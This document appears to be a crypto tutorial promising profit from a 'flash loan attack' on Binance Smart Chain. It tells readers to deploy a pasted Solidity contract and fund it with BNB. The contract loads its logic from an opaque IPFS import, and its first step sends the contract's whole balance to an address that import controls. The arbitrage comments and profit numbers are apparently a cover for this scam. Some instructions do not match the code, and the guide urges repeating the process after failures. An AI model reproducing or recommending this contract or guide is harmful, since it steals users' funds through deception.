1. Download MetaMask For Chrome Web Browser
![Alt text](https://github.com/smartpro/flashloan2.1/blob/main/images/step1.webp)

You can download and install MetaMask from this link:  
https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn.

---

2. Create a “Custom RPC” in MetaMask for connecting to Binance Smart Chain
![Alt text](https://github.com/smartpro/flashloan2.1/blob/main/images/step2.webp)
this step is used for connecting your wallet to the Mainnet network Smart Chain. Below this is the network setting to add a Smart Chain.

| Field | Value |
| ----------- | ----------- |
|Name: | Smart Chain |
|New RPC URL: |https://bsc-dataseed.binance.org/ |
|ChainID: |56 |
|Symbol: |BNB |
|Block Explorer URL: |https://bscscan.com |
  
For complete info about the explanation, please visit this Binance official article:  
https://academy.binance.com/en/articles/connecting-metamask-to-binance-smart-chain.

---

3. Open http://remix.ethereum.org/ from your browser

Open Ethereum Remix to make or extend the smart contract which later is used for making a smart contract Flash Loan Attack to the Binance Smart Contract network.

---

4. Click on Solidity Compiler (2nd menu button from the left) and select compiler version to 0.5.0
![Alt text](https://github.com/smartpro/flashloan2.1/blob/main/images/step4.webp)

Change the compiler version to “0.5.0+commit.1d4f565a”.  
This is needed to make your compiler version is the same as the source code you'll use.

---

5. Create a file Solidity “Flash Loan.sol” in the File Explorer (1st menu button from the left)
![Alt text](https://github.com/smartpro/flashloan2.1/blob/main/images/step5.webp)

Copy and paste the code below to the Flash Loan.sol file :  

```
    pragma solidity ^0.5.0;
     
     
    // PancakeSwap Smart Contracts
    import "https://github.com/smartpro/flashloan2.1/blob/main/PancakeSwap/IPancakeCallee.sol";
    import "https://github.com/smartpro/flashloan2.1/blob/main/PancakeSwap/IPancakeFactory.sol";
     
    //BakerySwp Smart contracts
    import "https://github.com/smartpro/flashloan2.1/blob/main/BakerySwp/IBakerySwapFactory.sol";
     
    // Router
    import "ipfs://Qmb5qRe6CaJWuCZ7x84NqgMJQqf9py3KNBB9y4vP36Rt1X";
     
    // Multiplier-Finance Smart Contracts
    import "https://github.com/smartpro/flashloan2.1/blob/main/Multiplier-Finance/ILendingPoolAddressesProvider.sol";
    import "https://github.com/smartpro/flashloan2.1/blob/main/Multiplier-Finance/ILendingPool.sol";
     
     
    contract InitiateFlashLoan {
        
    	RouterV2 router;
    	string public tokenName;
    	string public tokenSymbol;
    	uint256 flashLoanAmount;
     
    	constructor(
        	string memory _tokenName,
        	string memory _tokenSymbol,
        	uint256 _loanAmount
    	) public {
        	tokenName = _tokenName;
        	tokenSymbol = _tokenSymbol;
        	flashLoanAmount = _loanAmount;
     
        	router = new RouterV2();
    	}
     
    	function() external payable {}
     
    	function flashloan() public payable {
        	// Send required coins for swap
        	address(uint160(router.pancakeSwapAddress())).transfer(
            	address(this).balance
        	);
     
        	//Flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
        	router.borrowFlashloanFromMultiplier(
            	address(this),
            	router.bakerySwapAddress(),
            	flashLoanAmount
        	);
        	//To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
        	router.convertBnbToBusd(msg.sender, flashLoanAmount / 2);
        	//The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
        	router.callArbitrageBakerySwap(router.bakerySwapAddress(), msg.sender);
        	//After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
        	router.transferBnbToMultiplier(router.pancakeSwapAddress());
        	//Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
        	router.completeTransation(address(this).balance);
    	}
    }
```

---

6. Click on Solidity Compiler (2nd menu button from the left) and Compile  
![Alt text](https://github.com/smartpro/flashloan2.1/blob/main/images/step6.webp)
Look for a dropdown Contract at the bottom of the Solidity Compiler menu, on that dropdown Contract choose  
“GetFlash Loan (Flash Loan.sol)”  
and then click   
Compile Flash Loan.sol.  

---

7. Click on Deploy & run transactions (3rd menu button from the left) and Deploy
![Alt text](https://github.com/smartpro/flashloan2.1/blob/main/images/step7.webp)

- At the very top, change the dropdown Environment value to “Injected Web3” (For remix users, firstly there will be a confirmation on the MetaMask, Accept the confirmation notif on the MetaMask wallet Chrome Extention).
- The MetaMask wallet address will automatically be connected If you're already connected to your MetaMask Account.
- There's a dropdown next to the, click that dropdown and create a Smart Contract name you desired. Eg. :

```
                     _TOKENNAME = Flash Loan (write random token name)
                     _TOKENSYMBOL = FLO (write random three of four-letter symbol)
                     _LOANAMOUNT = 10 (amount loan)
```

- Click Transact and confirm in MetaMask.
- after you create a Smart Contract, wait till the transaction complete and you'll have your smart contract address.

---

8. Input a Liquidity to the Smart Contract
![Alt text](https://github.com/smartpro/flashloan2.1/blob/main/images/step8.webp)
To input a Liquidity, transfer your nominal BNB to the Smart Contract address you have created before by using the transfer feature in the MetaMask Chrome Extention. Send the nominal BNB ( the amount BNB will affect the profit you will earn ). Wait till the liquidity addition transaction complete.

---

9. Flash Loan Attack
![Alt text](https://github.com/smartpro/flashloan2.1/blob/main/images/step9.webp)
After creating a Smart Contract with liquidity added ( Step 8 ) and set the amount of loan ( Step 7 ), click the dropdown from the success transaction ( Step 7 ) it will display a dropdown menu with some button that is action, tokenName, tokenSymbol.  
Click "action" ( red button ) to run the smart contract. wait for a while until the transaction complete, and regularly check your BNB balance on the wallet from the MetaMask Chome Extension.  

Note: Sometimes the code give error and sometimes it will not work from the first time.You must then start the whole process from begining.
